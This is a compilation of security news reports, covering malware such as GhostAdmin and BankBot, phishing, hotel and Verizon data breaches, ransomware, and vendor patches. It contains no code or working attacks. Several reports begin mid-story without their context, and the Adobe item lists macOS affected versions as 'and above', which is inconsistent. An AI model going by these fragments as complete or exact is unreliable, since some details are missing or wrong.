According to current information, the malware is already distributed and deployed in live attacks, being used to possibly target at least two companies and steal hundreds of GBs of information.
According to MalwareHunterTeam and other researchers that have looked at the malware's source code, GhostAdmin seems to be a reworked version of CrimeScene, another botnet malware family that was active around 3-4 years ago.
Under the hood, GhostAdmin is written in C# and is already at version 2.0.
The malware works by infecting computers, gaining boot persistence, and establishing a communications channel with its command and control (C&C) server, which is an IRC channel.
GhostAdmin's authors access to this IRC channel and issue commands that will be picked up by all connected bots (infected computers).
The malware can interact with the victim's filesystem, browse to specific URLs, download and execute new files, take screenshots, record audio, enable remote desktop connections, exfiltrate data, delete log files, interact with local databases, wipe browsing history and more.
A full list of available commands is available via the image below:
The malware's features revolve around the ability to collect data from infected computers and silently send it to a remote server.
GhostAdmin operates based on a configuration file.
Among the settings stored in this file, there are FTP and email credentials.
The FTP credentials are for the server where all the stolen information is uploaded, such as screenshots, audio recordings, keystrokes and more.
On the other hand, the email credentials are used to send an email to the GhostAdmin author every time a victim executes his malware, and also send error reports.
MalwareHunterTeam says that the GhostAdmin version he analyzed was compiled by a user that used the nickname ""Jarad.""
Like almost all malware authors before him, Jarad managed to infect his own computer.
Using the FTP credentials found in the malware's configuration file, MalwareHunterTeam found screenshots of GhostAdmin creator's desktop on the FTP server.
Furthermore, the researcher also found on the same server files that appeared to be stolen from GhostAdmin victims.
The possible victims include a lottery company and an Internet cafe.
Just from the Internet cafe, the crook has apparently collected 368GB of data alone.
From the lottery company, the GhostAdmin botmaster appears to have stolen a database holding information such as names, dates of births, phone numbers, emails, addresses, employer information, and more.
At the time of writing, according to MalwareHunterTeam, the botnet's IRC channel includes only around ten bots, an approximate victims headcount.
Compared to other botnet malware families such as Necurs or Andromeda, which have millions of bots, GhostAdmin is just making its first victims.
In its current form, GhostAdmin and its botmaster seem to be focused on data theft and exfiltration.
At the time of writing, GhostAdmin detection rate on VirusTotal was only 6 out of 55 (sample here).

An email scam passing as a Netflix notification has been targeting subscribers of the streaming service. The “suspension notification” looks similar in design and format to other Netflix emails. It notifies and urges users to update their information to avoid the suspension of their account. The goal of the scam is to steal personal and credit card information, according to a report from Mailguard.
The email contains a link to a fake Netflix website where users are required to enter log-in information and a credit card number. The faux website has the Netflix logo on display plus The Crown and House of Cards banners to further trick visitors.
In a stament sent to EW, a Netflix spokesperson assured subscribers that the company takes the “security of our members’ accounts seriously,” also stating that these type of scams aren’t uncommon: “Netflix employs numerous proactive measures to detect fraudulent activity to keep the Netflix service and our members’ accounts secure. Unfortunately, these scams are common on the internet and target popular brands such as Netflix and other companies with large customer bases to lure users into giving out personal information.”
According to Mailguard’s report, the scam has targeted almost 110 million subscribers. One important thing to note is that the email’s recipient appears as “no sender,” plus the victim’s name appears as “#name#,” as shown in the screenshot. Netflix customers who receive this email are advised to abstain from filling out any information prompted by the website.
Netflix’s spokesperson also suggested that members of the streaming service visit netflix.com/security or contact Customer Service directly to learn more information about scams and other malicious activity.

Breaches involving major players in the hospitality industry continue to pile up. Today, travel industry giant Sabre Corp. disclosed what could be a significant breach of payment and customer data tied to bookings processed through a reservations system that serves more than 32,000 hotels and other lodging establishments.
In a quarterly filing with the U.S. Securities and Exchange Commission (SEC) today, Southlake, Texas-based Sabre said it was “investigating an incident of unauthorized access to payment information contained in a subset of hotel reservations processed through our Hospitality Solutions SynXis Central Reservations system.”
According to Sabre’s marketing literature, more than 32,000 properties use Sabre’s SynXis reservations system, described as an inventory management Software-as-a-Service (SaaS) application that “enables hoteliers to support a multitude of rate, inventory and distribution strategies to achieve their business goals.”
Sabre said it has engaged security forensics firm Mandiant to support its investigation, and that it has notified law enforcement.
“The unauthorized access has been shut off and there is no evidence of continued unauthorized activity,” reads a brief statement that Sabre sent to affected properties today. “There is no reason to believe that any other Sabre systems beyond SynXis Central Reservations have been affected.”
Sabre’s software, data, mobile and distribution solutions are used by hundreds of airlines and thousands of hotel properties to manage critical operations, including passenger and guest reservations, revenue management, flight, network and crew management. Sabre also operates a leading global travel marketplace, which processes more than $110 billion of estimated travel spend annually by connecting travel buyers and suppliers.
Sabre told customers that it didn’t have any additional details about the breach to share at this time, so it remains unclear what the exact cause of the breach may be or for how long it may have persisted.
A card involving traveler transactions for even a small percentage of the 32,000 properties that are using Sabre’s impacted technology could jeopardize a significant number of customer credit cards in a short amount of time.
The news comes amid revelations about a blossoming breach at Intercontinental Hotel Group (IHG), the parent company that manages some 5,000 hotels worldwide, including Holiday Inn and Holiday Inn Express.
KrebsOnSecurity first reported in December 2016 that cards used at IHG properties were being sold to fraudsters, but it took until February 2017 for IHG to announce it had found malicious software installed at front-desk systems at just a dozen of its properties. On April 18, IHG disclosed in an update on the investigation that more than 1,200 properties were affected, and that there could well be more added in the coming days.
According to Verizon‘s latest annual Data Breach Investigations Report (DBIR), malware attacks on point-of-sale systems used at front desk and hotel restaurant systems “are absolutely rampant” in the hospitality sector. Accommodation was the top industry for point-of-sale intrusions in this year’s data, with 87% of breaches within that pattern.
“Apparently, it is not only The Eagles that are destined for a long stay at the hotel,” Verizon mused in its report. “The hackers continue to be checked in indefinitely as well. Breach timelines continue to paint a rather dismal picture—with time-to-compromise being only seconds, time-to-exfiltration taking days, and times to discovery and containment staying firmly in the months camp.”
Card-stealing cyber thieves have broken into some of the largest hotel chains over the past few years. Hotel brands that have acknowledged card breaches over the last year after prompting by KrebsOnSecurity include Kimpton Hotels, Trump Hotels (twice), Hilton, Mandarin Oriental, and White Lodging (twice). Card breaches also have hit hospitality chains Starwood Hotels and Hyatt. 
In many of those incidents, thieves planted malicious software on the point-of-sale devices at restaurants and bars inside of the hotel chains. Point-of-sale based malware has driven most of the credit card breaches over the past two years, including intrusions at Target and Home Depot, as well as breaches at a slew of point-of-sale vendors. The malicious code usually is installed via hacked remote administration tools. Once the attackers have their malware loaded onto the point-of-sale devices, they can remotely capture data from each card swiped at that cash register.
Thieves can then sell that data to crooks who specialize in encoding the stolen data onto any card with a magnetic stripe, and using the cards to purchase high-priced electronics and gift cards from big-box stores like Target and Best Buy.
Readers should remember that they’re not liable for fraudulent charges on their credit or debit cards, but they still have to report the unauthorized transactions. There is no substitute for keeping a close eye on your card statements. Also, consider using credit cards instead of debit cards; having your checking account emptied of cash while your bank sorts out the situation can be a hassle and lead to secondary problems (bounced checks, for instance).

The mobile apps of seven banks in India were infected with malware that can steal sensitive financial information, a study has revealed.
According to US-based cyber security firm FireEye, banking network frauds have spread around the world.
The firm has tracked such incidents that affected banks in Ukraine, Ecuador and India, with losses totalling more than $100 million.
“In India, we have seen financially-motivated cyber-criminal groups launching sophisticated attacks to steal funds from many potential sources: organisations, consumers, ATMs and banks.
“As India’s digital payment systems handle more transactions, they will become more lucrative targets,” Vishal Raman, India Head at FireEye told BusinessLine.
“We have found mobile apps of seven large banks in India infected with malware that has the capability to steal user credentials.
We have informed the banks about the same,” Raman said, without disclosing the names of the banks to prevent misuse of the vulnerabilities.
Raman said that while the security deployed by banks in India has improved over the years, hackers seem to be moving faster and banks are merely playing catch-up.
“We’re seeing a much higher degree of sophistication from attackers than ever before.
Nation-states continue to set a high bar for sophisticated cyber attacks, but some financial threat actors have caught up.
Financial attackers have improved their tactics, techniques and procedures to the point where they have become difficult to detect and challenging to investigate and remediate,” he said.
According to FireEye, a majority of both victim organisations and those working diligently on defensive improvements are still lacking fundamental security controls and capabilities to either prevent breaches or to minimise the damages and consequences of an inevitable compromise.
The two major malware found on Indian banking apps by FireEye are: Webinjects and Bugat.
Webinjects are a functionality integrated into many types of credential theft malware that allow hackers to dynamically alter what is displayed to victims on an infected device (mobile phone).
In some cases a message is displayed that encourages users to download a malicious application, under the guise of installing a personal security certificate for their cell phone SIM card.
Bugat is a credential theft malware used by a limited number of cyber-crime groups.
These groups spread the malware widely often through spam e-mail campaigns.
“Based on our analysis of Bugat configuration files observed in August 2015, targets exclusively related to financial services used by consumers, corporations and financial services were added during this time, continuing the operators’ focus on this sector,” Raman said.

Adobe has patched a number of security vulnerabilities on the last scheduled monthly update of this year. All these patches specifically addressed bugs in Adobe Reader and Acrobat. Allegedly, Adobe December Patch Tuesday Update fixed as much as 86 different vulnerabilities, including 38 critical security flaws.
This week, Adobe rolled out the last scheduled monthly updates for its products. While the previous month’s update included bug fixes in Flash Player, the Adobe December Patch Tuesday update bundle remained focused on Adobe Reader and Acrobat. As much as 38 different critical security bugs received patches with this update.
The vulnerabilities include 2 buffer errors, 2 Untrusted pointer dereference vulnerabilities, 5 out-of-bounds write vulnerabilities, 3 heap overflow bugs, and 23 use after free vulnerabilities. All these vulnerabilities could allegedly lead to arbitrary code execution by a potential attacker. In addition, 3 security bypass vulnerabilities also received fixes with this update. These flaws could allow privilege escalation on the targeted systems.

In addition to the above, Adobe also released fixes for 48 important security vulnerabilities. These include, 43 out-of-bounds read vulnerabilities, 4 integer overflow bugs, and a single security bypass bug. All these could allegedly result in information disclosure.
As stated in Adobe’s advisory, the affected software include the following for Windows,
   Acrobat DC and Acrobat Reader DC (continuous track) versions 2019.008.20081 and earlier,
   Adobe Acrobat 2017 and Acrobat Reader 2017 (Classic 2017 track) versions 2017.011.30106 and earlier,
   Acrobat DC and Acrobat Reader DC (Classic 2015 track) versions 2015.006.30457 and earlier.
Whereas, in the case of MacOS, the affected programs include,
   Acrobat DC and Acrobat Reader DC (continuous track) versions including and prior to 2019.008.20080,
   Adobe Acrobat 2017 and Acrobat Reader 2017 (track Classic 2017) versions 2017.011.30105 and above,
   Acrobat DC and Acrobat Reader DC (track Classic 2015) versions 2015.006.30456 and above.

Adobe has patched all 86 vulnerabilities in the recently released versions of the respective software. The patched versions include Acrobat DC and Acrobat Reader DC versions 2019.010.20064 (continuous track), Acrobat 2017 and Acrobat Reader DC 2017 (Classic 2017) version 2017.011.30110, and Acrobat DC and Acrobat Reader DC (track Classic 2015) version 2015.006.30461. Users of both Windows and MacOS should, therefore, ensure updating their systems and download the latest versions of the affected software to stay protected from these vulnerabilities.
This month’s scheduled update bundle did not address any security flaws in Flash Player. Nonetheless, lately, Adobe already patched a critical Flash vulnerability already disclosed to the public.

Around 50% of the impacted accounts never posted on the forum which leads to the conclusion that they weren’t real users but bots.
The stolen data contains email addresses, hashed passwords, and salts but none of the usernames were taken.
However, good news is that all passwords have been reset.
Therefore it’s too early to assume what happened or how attackers were able to access the database.
Nevertheless, the administrators believe that it could be because of a phishing attack.
It must be noted that one of the forum’s staff members was also impacted by the breach which is not surprising since hackers are successfully cracking passwords from previous data breaches and using them for further attacks.

Hackers have been trying to blackmail patients of a Lithuanian plastic surgery clinic, by threatening to publish their nude “before and after” photos online.
The photos were stolen earlier this year, along with other sensitive data – passport scans, national insurance numbers, etc – from the servers of Grozio Chirurgija, which has clinics in Vilnius and Kaunas.
According to The Guardian, the stolen data was first offered for sale in March. At that time, the hackers, who call themselves “Tsar Team,” released a small portion of the database to prove the veracity of their claims and to entice buyers.
They asked for 300 bitcoin for the entire lot, and at the same time contacted some of the affected patients directly, offering to delete the sensitive data for a sum that varied between €50 and €2,000 (in bitcoin).
Apparently, among the patients of the clinic were also celebrities, both Lithuanian and not, and individuals from various European countries, including 1,500 from the UK.
It is unknown if any of them paid the ransom, but the clinic did not try to buy back the stolen data. Instead, they called in the Lithuanian police, CERT and other authorities to help them prevent the spread of the data online, and to find the culprits.
They’ve also asked the affected patients to notify the police if they got a ransom request from the hackers; to notify news portals, forums or social networking sites of any links to the stolen data that may have been published in the comments on their sites and ask them to remove them; and do the same if they find a link through Google Search.
In the meantime, the hackers decided to leak online over 25,000 of the private photos they have stolen, more than likely in an attempt to force the affected patients’ hand and get at least some money.
It’s interesting to note that the name of the hacker group – Tsar Team – is also a name that has been associate with the Pawn Storm attackers (aka APT28, aka Sofacy), a Russian cyberespionage group that has targeted a wide variety of high-profile targets, including the NATO, European governments, the White House, and so on.
It is unclear, though, if this is the same group. Given that it is a very unusual target for APT28, it’s possible that these attackers have simply used the name to add weight to their demands.

The Onslow Water and Sewer Authority's internal computer system, including servers and personal computers, was hit by a ransomware attack Saturday.
The utility said customer information was not compromised in the attack, but many of databases will have to be recreated in their entirety.
OWNASA said it is coordinating with the FBI, the Department of Homeland Security, the state of North Carolina,  and several technology security companies in response to the attack.
The safety of the public’s water supply and the area’s environment are not in danger, the utility said.
ONWASA began experiencing persistent virus attacks from a polymorphic malware known as EMOTET on October 4.
The virus was thought to be under control, but when it persisted ONWASA brought in outside security specialists. 
The specialist continued to work the problem with ONWASA Information Technology (IT) staff. 
At what ONWASA officials said may have been a timed event, the malware launched a sophisticated virus known as RYUK at 3 a.m. on Saturday.
An ONWASA IT staffer saw the attack and immediately disconnected ONWASA from the internet.
However, the crypto-virus spread quickly along the network, encrypting databases and files. 
The attack is similar in nature to those experienced by Atlanta, Georgia and Mecklenburg County. 
lONWASA said it had mulitple layers of computer protection in place, including firewalls and malware/anti-virus software. 
The defenses of the computer systems at the main office were penetrated. 
ONWASA has received one email from the cybercriminals, who it said may be based in a foreign country. 
The email is consistent with ransomware attacks of other governments and corporations. 
OWNASA officials said ransom monies “would be used to fund criminal, and perhaps terrorist activities in other countries. Furthermore, there is no expectation that payment of a ransom would forestall repeat attacks. ONWASA will not negotiate with criminals nor bow to their demands. The FBI agrees that ransoms should not be paid. ONWASA will undertake the painstaking process of rebuilding its databases and computer systems from the ground up.”
The lack of computing ability will affect the timeliness of service from ONWASA for several weeks to come. Initially, the utility will operate manually at all plant and office locations.
Water and wastewater service to homes and businesses will not be interrupted, the utility said. 
Customers may continue to make credit card payments by phone, at ONWASA's kiosk locations (by check, cash, or credit card), and in person at the main office at 228 Georgetown Road, Jacksonville. 
Satellite Offices in Holly Ridge, Swansboro, and Richlands have the capability of processing credit card payments by phone and very limited other services. 
Service orders, account creation, connections, disconnections, development review, backflow program, engineering, and human resources will utilize manual processes until the computer systems are restored. 
While phone service remains, email service has been interrupted for most of the utility. 
ONWASA said a team of local, state, and federal agencies are cooperating to restore the utility and bring the criminals to justice.

Six million of Verizon's US customers had their personal and account information exposed, including PIN numbers.
Verizon Communications suffered a major data leak due to a misconfigured cloud server that exposed data on 6 million of its customers.
The leak was the result of its third-party provider NICE Systems incorrectly configuring Verizon's cloud-based file repository housed in an Amazon Web Services S3 bucket on NICE's cloud server, according to UpGuard, which issued a report on the breach today. Verizon customer names, addresses, account information, including account personal identification numbers (PINs), were compromised.
UpGuard in its data estimated that up to 14 million customer records were exposed, but Verizon stated that data on 6 million of its users was affected.
In one file alone, there were 6,000 PINs that were publicly exposed, according to Dan O'Sullivan, a cyber resilience analyst for UpGuard. 
What's unique about this leak is that it was not just personal data that was publicly exposed but also PINs, according to O'Sullivan. ""The PINs are used to identify a customer to a customer care person,"" O'Sullivan says, noting that an attacker could impersonate the user by using the PIN and then gain access to that individual's account.
Verizon issued a statement acknowledging the public exposure of its customer data, but stressed that no loss or theft of Verizon or Verizon customer information occurred. The telecom giant also noted: ""To the extent PINs were included in the data set, the PINs are used to authenticate a customer calling our wireline call center, but do not provide online access to customer accounts,"" Verizon stated.
""An employee of one of our vendors put information into a cloud storage area and incorrectly set the storage to allow external access,"" Verizon said.
How it Went Down
NICE was hired to help Verizon improve its residential and small business wireline self-service call center portal, according to Verizon's statement. As part of this project, NICE needed certain data that included a limited amount of personal and cell phone number information. None of the information stored for the project included social security numbers, according to Verizon.
Meanwhile, on June 8, UpGuard's cyber risk research director Chris Vickery came across the AWS S3 data repository and its subdomain ""verizon-sftp."" The repository held six folders with titles spanning ""Jan-2017"" to ""June-2017"" and a number of other files with a .zip format. Vickery was able to fully download the repository because it was configured to be publicly accessible to anyone entering the S3 URL.
Following the discovery, UpGuard contacted Verizon on June 13 to inform the telecom giant of the data leakage and then on June 22 the exposure was sealed up, according to UpGuard's report.
""There was a fairly long duration of time before it was fixed, which is troubling,"" O'Sullivan says.
Verizon is not the first company to encounter data leakage as a result of permissions set to public rather than private on Amazon's S3 bucket. Earlier this year, UpGuard also discovered a similar situation that involved the Republican National Committee (RNC), which left millions of voter records exposed on the cloud account.
As in the Verizon case, the RNC relied on a third party vendor to handle its cloud storage needs and it too used Amazon's AWS S3. That third-party also improperly set the database to public rather than private.
""The number one thing to keep in mind if you are a CISO is evaluating your third-party vendors. You can have the best security in the world and the best visibility into your systems, but if you pass it onto a third-party vendor without checking out how well they handle their security, then you have done that all in vain,"" O'Sullivan says. ""Verizon did not own the server that was involved here, but it will own the consequences.""
Rich Campagna, CEO of Bitglass, stressed the importance of security teams ensuring services used are configured securely. ""This massive data leak could have been avoided by using specific data-centric security tools, which can ensure appropriate configuration of cloud services, deny unauthorized access, and encrypt sensitive data at rest,"" Campagna said in a statement.

Hard Rock Hotels & Casinos alongside Loews Hotels have warned customers that a security failure may have resulted in the theft of their information.
Both incidents appear to have been linked to a third-party reservation platform, SynXis, which only begun informing client hotels of the security breach in June, months after the attacks took place.
Hard Rock Hotels & Casinos issued a statement informing customers of the data breach last week, which took place due to the Sabre Hospitality Solutions SynXis third-party reservation system.
The hotel chain, which operates 176 cafes, 24 hotels and 11 casinos in 75 countries, said SynXis, the backbone infrastructure for reservations made through hotels and travel agencies, provided the avenue for data theft and the exposure of customer information.
""The unauthorized party first obtained access to payment card and other reservation information on August 10, 2016,"" the hotel chain said. ""The last access to payment card information was on March 9, 2017.""
Hard Rock Hotel & Casino properties in Biloxi, Cancun, Chicago, Goa, Las Vegas, Palm Springs, Panama Megapolis, Punta Cana, Rivera Maya, San Diego and Vallarta are all affected.
According to Sabre, an ""unauthorized party gained access to account credentials that permitted unauthorized access to payment card information, as well as certain reservation information"" for a ""subset"" of reservations.
The attacker was able to grab unencrypted payment card information for hotel reservations, including cardholder names, card numbers, and expiration dates. In some cases, security codes were also exposed, alongside guest names, email addresses, phone numbers, and addresses.
In May, Sabre said an investigation into a possible breach was underway. In a quarterly SEC filing, the company said, ""unauthorized access has been shut off, and there is no evidence of continued unauthorized activity at this time.""
While Sabre has not revealed exactly how the system was breached, the company has hired third-party cybersecurity firm Mandiant to investigate.
Loews Hotels also appears to be a victim of the same security failure. According to NBC, Sabre was also at fault and cyberattackers were able to slurp credit card, security code, and password information through the booking portal. In some cases, email addresses, phone numbers, and street addresses were also allegedly exposed.
According to Sabre, its software is used by roughly 36,000 hotel properties.
""Not all reservations that were viewed included the payment card security code, as a large percentage of bookings were made without a security code being provided,"" Sabre said in a statement. ""Others were processed using virtual card numbers in lieu of consumer credit cards. Sabre has notified law enforcement and the credit card brands as part of our investigation.""
If you stayed in one of these properties on the dates mentioned above, you may be at risk of identity theft should the attackers choose to sell their stolen cache of data.
Sabre suggests signing up for a free credit report -- available to US consumers once a year for free -- and notify their bank of any stolen activity. However, no compensation has yet been made available.
These hotel chains are far from the only ones that have suffered a data breach in recent years. Back in April, InterContinental admitted that a data breach first believed to be isolated to 12 properties actually harmed roughly 1,200, resulting in the exposure of customer credit card data.

Panda Security researchers have been following and analyzing ransomware attacks that have been targeting European business for a few months now, and have tied them to the same group.
Through it, the attackers can chose which contact email to provide to the victim in the ransom message, which files and folders will be encrypted, whether the malware will autodelete after the encryption process, and so on.
These attacks are a definite indication that the Ransomware-as-a-Service trend is gaining momentum, and ransomware-wielding crooks don’t need to be extremely skilled to perform the attacks.
In these specific cases, securing RDP servers is critical, and can be done by either making them inaccessible from the Internet, or by employing long and hard-to-guess passwords and two factor authentication for user accounts with remote access.
Encrypting the remote connection is also a good idea.
Vulnerable RDP servers provide attackers with a perfect staging point within the organization’s network.
From there, they can find more information about the machines on the network, and make a more informed decision about which of them hold information and files that are crucial for the firm.

Intel has issued fresh ""microcode revision guidance"" that reveals it won’t address the Meltdown and Spectre design flaws in all of its vulnerable processors – in some cases because it's too tricky to remove the Spectre v2 class of vulnerabilities.
The new guidance, issued April 2, adds a “stopped” status to Intel’s “production status” category in its array of available Meltdown and Spectre security updates. ""Stopped"" indicates there will be no microcode patch to kill off Meltdown and Spectre.
The guidance explains that a chipset earns “stopped” status because, “after a comprehensive investigation of the microarchitectures and microcode capabilities for these products, Intel has determined to not release microcode updates for these products for one or more reasons.”
Those reasons are given as:

    Micro-architectural characteristics that preclude a practical implementation of features mitigating [Spectre] Variant 2 (CVE-2017-5715)
    Limited Commercially Available System Software support
    Based on customer inputs, most of these products are implemented as “closed systems” and therefore are expected to have a lower likelihood of exposure to these vulnerabilities.

Thus, if a chip family falls under one of those categories – such as Intel can't easily fix Spectre v2 in the design, or customers don't think the hardware will be exploited – it gets a ""stopped"" sticker. To leverage the vulnerabilities, malware needs to be running on a system, so if the computer is totally closed off from the outside world, administrators may feel it's not worth the hassle applying messy microcode, operating system, or application updates.
""Stopped"" CPUs that won’t therefore get a fix are in the Bloomfield, Bloomfield Xeon, Clarksfield, Gulftown, Harpertown Xeon C0 and E0, Jasper Forest, Penryn/QC, SoFIA 3GR, Wolfdale, Wolfdale Xeon, Yorkfield, and Yorkfield Xeon families. The new list includes various Xeons, Core CPUs, Pentiums, Celerons, and Atoms – just about everything Intel makes.
Most the CPUs listed above are oldies that went on sale between 2007 and 2011, so it is likely few remain in normal use.
There’s some good news in the tweaked guidance: the Arrandale, Clarkdale, Lynnfield, Nehalem, and Westmere families that were previously un-patched now have working fixes available in production, apparently.
“We’ve now completed release of microcode updates for Intel microprocessor products launched in the last 9+ years that required protection against the side-channel vulnerabilities discovered by Google Project Zero,"" an Intel spokesperson told The Reg.
""However, as indicated in our latest microcode revision guidance, we will not be providing updated microcode for a select number of older platforms for several reasons, including limited ecosystem support and customer feedback.”
Now all Intel has to do is sort out a bunch of lawsuits, make sure future products don’t have similar problems, combat a revved-up-and-righteous AMD and Qualcomm in the data centre, find a way to get PC buyers interested in new kit again, and make sure it doesn’t flub emerging markets like IoT and 5G like it flubbed the billion-a-year mobile CPU market.

The site was taken offline to patch the security bug, and only publicly accessible information was lifted from the compromised web servers, we're told.
The flaw in the Struts 2 framework is trivial to exploit: just upload a file with an invalid Content-Type value.
It then throws an exception, and opens the target to remote code execution.
Shortly after the Struts 2 vulnerability was discovered and documented last week, researchers at Cisco's Talos said they'd observed it under “active attack”.
The Canada Revenue Agency held a press conference in Ottawa Monday afternoon, and confirmed Struts 2 was the reason it took down its services over the weekend.
Shared Service Canada COO John Glowacki said while forensic work is continuing, analysis of system logs so far shows nobody “got inside” CRA's systems.
“We will not speak for other countries, but we will say we have information that some other countries are having greater problems with this specific vulnerability,” he added.
Expect vendors to start issuing their own advisories about Struts 2.
Cisco has posted its first product advisory, and so far there's more ""confirmed not vulnerable"" than vulnerable products.
So far, only Cisco's Identity Services Engine, Prime Service Catalog Virtual Appliance, and Unified SIP Proxy Software need fixing.
There is, however, an extensive list of products still under investigation.

Mozilla released nine fixes in its Wednesday launch of Firefox 62 for Windows, Mac and Android – including one for a critical glitch that could enable attackers to run arbitrary code.
Overall, the latest version of the Firefox browser included fixes for the critical issue, three high-severity flaws, two moderate problems and three low-severity vulnerabilities. Topping the list is a memory safety bug (CVE-2018-12376), discovered by a number of Mozilla developers and community members.
A critical impact bug means the vulnerability can be used to run attacker code and install software, requiring no user interaction beyond normal browsing, according to Mozilla. The memory safety problem, which exists in Firefox 61 and Firefox ESR 60, meets these criteria, researchers said. Mozilla didn’t release further details, but it did assign one CVE to represent multiple similar issues.
In addition to the memory safety bug(s), Mozilla also fixed three high-severity vulnerabilities in its latest update.
These include a use-after-free glitch in refresh driver timers (CVE-2018-12377), which power browser-page refreshes.
Another high-severity bug (CVE-2018-12378) is a use-after-free vulnerability that occurs when an IndexedDB index (a low-level API for client-side storage of significant amounts of structured data) is deleted while still in use by JavaScript code providing payload values. “This results in a potentially exploitable crash,” the advisory said.
Mozilla developers and community members also found a memory-safety bug (CVE-2018-12375) in Firefox 61, which showed evidence of memory corruption and could be exploited to run arbitrary code, according to the advisory.
The moderate and low-severity fixes that were deployed in Firefox 62 include patches for an out-of-bounds write flaw (triggered when the Mozilla Updater opens a MAR format file that contains a very long item filename); and a proxy bypass glitch in the browser’s proxy settings.
Firefox 62 for desktop is available for download on Mozilla’s website.

It is followed by the United States Postal Service (USPS) with 88,153 leaked employee records and AT&T with 67,382.
Other firms affected by the leak includes CVS with 40,739 records, Citigroup with 35,292 and IBM with 33,412.
The database contains dozens of fields, some including personal information such as names, job titles and functions, work email addresses, and phone numbers.
While the database doesn't contain more sensitive information, such as credit card numbers or SSNs, Hunt says it's an ""absolute goldmine for targeted spear phishing.""
""From this data, you can piece together organisational structures and tailor messaging to create an air of authenticity and that's something that's attractive to crooks and nation-state actors alike,"" he said.
""I often work with companies attempting to mitigate the damage of their organisational data being publicly exposed (frequently due to data breaches), and I can confidently say that knowing this information is out there circulating would concern many of them.""
Dun & Bradstreet has denied responsibility for the leak and said it could have come from come from any of its thousands of clients.
""Based on our analysis, it is our determination that there has been no exposure of sensitive personal information from, and no infiltration of our system.
The information in question is data typically found on a business card.
""As general practice, Dun & Bradstreet uses an agile security process and evaluates and evolves security controls to protect the integrity of our data,"" a spokesperson told the INQUIRER.

A zero-day vulnerability present in security cameras and surveillance equipment using Nuuo software is thought to impact hundreds of thousands of devices worldwide.
Researchers from cybersecurity firm Tenable disclosed the bug, which has been assigned as CVE-2018-1149.
The vulnerability cannot get much more serious, as it allows attackers to remotely execute code in the software, the researchers said in a security advisory on Monday.
Nuuo, describing itself as a provider of ""trusted video management"" software, offers a range of video solutions for surveillance systems in industries including transport, banking, government, and residential areas.
Dubbed ""Peekaboo,"" the zero-day stack buffer overflow vulnerability, when exploited, allows threat actors to view and tamper with video surveillance recordings and feeds. It is also possible to use the bug to steal data including credentials, IP addresses, port usage, and the make & models of connected surveillance devices.
Such a security vulnerability has wide-reaching, real-world consequences -- as criminals could compromise a surveillance camera feed, replace the footage with a static image, and raid a premises, for example.
In addition, the bug could be used to fully disable cameras and surveillance products.
Peekaboo specifically impacts the NVRMini 2 NAS and network video recorder, which acts as a hub for connected surveillance products. When exploited, the product permitted access to the control management system (CMS) interface, which further exposes credentials of all connected video surveillance cameras connected to the storage system.
Speaking to ZDNet, Gavin Millard, VP of threat intelligence at Tenable, said that organizations all over the world use Nuuo software, including in shopping centers, hospitals, banks, and public areas.
However, therein lies the problem -- as the software is also white labeled to over 100 brands and 2,500 camera product lines.

Tenable disclosed the zero-day vulnerability to Nuuo. A patch has not been released, but Nuuo is currently developing a fix for deployment.
A plugin has also been released by Tenable for organizations to assess whether or not they are vulnerable to Peekaboo.
ZDNet has reached out to Nuuo and will update if we hear back.

Microsoft has quickly reacted to the disclosure of a previously unknown zero-day vulnerability in the Windows operating system.
On Monday, Twitter user SandboxEscaper revealed the existence of the bug on the microblogging platform. As reported by the Register, the user said:
    ""Here is the alpc bug as 0day. I don't f**king care about life anymore. Neither do I ever again want to submit to MSFT anyway. F**k all of this shit.""
The user linked to a page on GitHub which appears to contain a proof-of-concept (PoC) for the vulnerability.
Following the disclosure, on Tuesday, Will Dormann, vulnerability analyst at CERT/CC verified the bug, adding that the zero-day flaw works ""well in a fully-patched 64-bit Windows 10 system.""
The Windows vulnerability is described as a local privilege escalation security flaw in the Microsoft Windows task scheduler caused by errors in the handling of Advanced Local Procedure Call (ALPC) systems.
If exploited, the zero-day bug permits local users to obtain system privileges. As ALPC is a local system, the impact is limited, but the public disclosure of a zero-day is still likely a headache for the Redmond giant.
There are no known workarounds for the vulnerability, which has been awarded a CVSS score of 6.4 -- 6.8.
SandboxEscaper's tweet has since been deleted. However, Microsoft has acknowledged the zero-day flaw.
This is likely to take place on September 11, the next scheduled Microsoft Patch Tuesday, unless the firm decides to issue an out-of-schedule patch.
    ""Windows has a customer commitment to investigate reported security issues, and proactively update impacted devices as soon as possible. Our standard policy is to provide solutions via our current Update Tuesday schedule.""

The Russian antivirus maker says the leaked source code appears to be a high-quality product and the security firm is positive this will attract the attention of many cyber-criminals looking for a base to develop and deploy their own mobile malware.
Android banking trojans are usually sold for thousands of dollars, or rented for similar high fees.
The easily availability of this trojan might lead to a surge in banking trojans targeting Android devices, Dr.Web researchers warn.
According to the company, the leaked source code has already been taken, tweaked and twisted into a new banking trojan named Android.BankBot, currently seen in live infections.
The BankBot version detected in the wild appears to target only users of Russian banks.
According to Dr.Web, the trojan will lie in hiding until the user opens mobile banking apps or social media apps.
When this happens, the trojan shows fake login overlays, asking the user to reauthenticate or re-enter his payment card details, where appropriate.
BankBot can phish for credentials using overlays for apps such as Facebook, Viber, Youtube, WhatsApp, Uber, Snapchat, WeChat, imo, Instagram, Twitter, and the Google Play Store.
This data is collected and sent back to online servers, where the crook can access it via a neatly arranged backend.
Once the BankBot author has access to user information, he can initiate banking transactions, or sell the user's social media credentials online.
When siphoning money out of a victim's bank account, BankBot will also intercept and silently delete incoming SMS messages, meaning the bank's transaction notification never reaches the user.
Other BankBot features include the ability to send SMS messages and USSD requests, steal the user's contacts list, track the user via GPS coordinates, and request additional permissions via popups for the latest Android OS versions, where the permissions system is more layered and interactive than in previous releases.

Email addresses, passwords and IP addresses were exposed.
The breach, which took place in September 2015 but was only recently disclosed, compromised email addresses, passwords and IP addresses, the Daily Mail reports.
The hacker's likely aim was to profit financially from the stolen information.
""Data breaches are often sold via darkweb sites or within closed trading circles,"" Hunt told the Daily Mail.
Still, Willy Leichter, vice president of marketing at CipherCloud, told eSecurity Planet by email that while the attack targeted gaming forums, any large scale breach like this should concern businesses as well.
""Users often use common passwords, security questions, or personal email addresses to access personal and work-related systems, making it easier for hackers to break into corporate networks and steal massive amounts of data,"" he said.
And while all users are being advised to change their passwords, Jeff Hill, director of product management at Prevalent, said it may be too late to make a difference.
""The initial breach occurred in September 2015, giving the attackers 17 months to operate undetected, more than enough time to find and exfiltrate enough data to profit greatly from their efforts,"" he said.
""At this point, it’s not even clear the breach was actually detected -- possibly the attackers simply [wrung] as much return as possible out of their theft, and simply discarded the remaining useless data,"" Hill added.

